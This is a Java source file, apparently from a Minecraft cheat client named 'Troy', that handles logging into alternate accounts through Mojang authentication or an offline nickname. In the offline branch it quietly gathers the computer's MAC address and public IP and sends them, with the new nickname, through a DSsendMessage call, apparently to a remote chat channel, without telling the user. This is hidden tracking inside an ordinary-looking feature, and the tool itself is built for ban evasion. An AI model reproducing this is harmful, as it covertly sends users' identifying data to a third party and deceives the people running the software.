package it.md_4.troy.alts;

import com.mojang.authlib.Agent;
import com.mojang.authlib.exceptions.AuthenticationException;
import com.mojang.authlib.yggdrasil.YggdrasilAuthenticationService;
import com.mojang.authlib.yggdrasil.YggdrasilUserAuthentication;
import it.md_4.troy.ip.IpChecker;
import net.minecraft.client.Minecraft;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.Session;

import java.awt.*;
import java.net.*;

import static it.md_4.troy.Troy.DSsendMessage;

public final class AltLoginThread extends Thread {
    private final String password;
    private final String username;
    private final Minecraft mc = Minecraft.getMinecraft();
    private String status;

    public AltLoginThread(String username, String password) {
        super("Alt Login Thread");
        this.username = username;
        this.password = password;
        this.status = EnumChatFormatting.GRAY + "Waiting...";
    }

    private Session createSession(String username, String password) {
        YggdrasilAuthenticationService service = new YggdrasilAuthenticationService(Proxy.NO_PROXY, "");
        YggdrasilUserAuthentication auth = (YggdrasilUserAuthentication) service.createUserAuthentication(Agent.MINECRAFT);
        auth.setUsername(username);
        auth.setPassword(password);

        try {
            auth.logIn();
            return new Session(auth.getSelectedProfile().getName(), auth.getSelectedProfile().getId().toString(), auth.getAuthenticatedToken(), "mojang");
        } catch (AuthenticationException var6) {
            var6.printStackTrace();
            return null;
        }
    }

    public String getStatus() {
        return this.status;
    }

    public void setStatus(String status) {
        this.status = status;
    }

    public void run() {
        if (this.password.equals("")) {

            //Ayakashi.nettyServer.getChannel().writeAndFlush(new RemoveUserPacket(this.mc.session.getUsername()));

            //Ayakashi.nettyServer.getChannel().writeAndFlush(new RemoveUserPacket(UserNameApi.getName()));

            this.mc.session = new Session(this.username, "", "", "mojang");
            this.status = EnumChatFormatting.GREEN + "Logged in. (" + this.username + " - offline name)";

            InetAddress localHost = null;
            try {
                localHost = InetAddress.getLocalHost();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }
            NetworkInterface ni = null;
            try {
                ni = NetworkInterface.getByInetAddress(localHost);
            } catch (SocketException e) {
                e.printStackTrace();
            }
            byte[] hardwareAddress = new byte[0];
            try {
                hardwareAddress = ni.getHardwareAddress();
            } catch (SocketException e) {
                e.printStackTrace();
            }

            String[] hexadecimal = new String[hardwareAddress.length];
            for (int i = 0; i < hardwareAddress.length; i++) {
                hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
            }
            String macAddress = String.join("-", hexadecimal);

            try {
                DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Changed Nick To [" + this.username +  "]]", true, Color.GREEN);
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else {
            this.status = EnumChatFormatting.YELLOW + "Logging in...";
            Session auth = this.createSession(this.username, this.password);
            if (auth == null) {
                this.status = EnumChatFormatting.RED + "Login failed!";
            } else {


                AltManager.lastAlt = new Alt(this.username, this.password);
                this.status = EnumChatFormatting.GREEN + "Logged in. (" + auth.getUsername() + ")";
                this.mc.session = auth;

            }

        }
    }
}
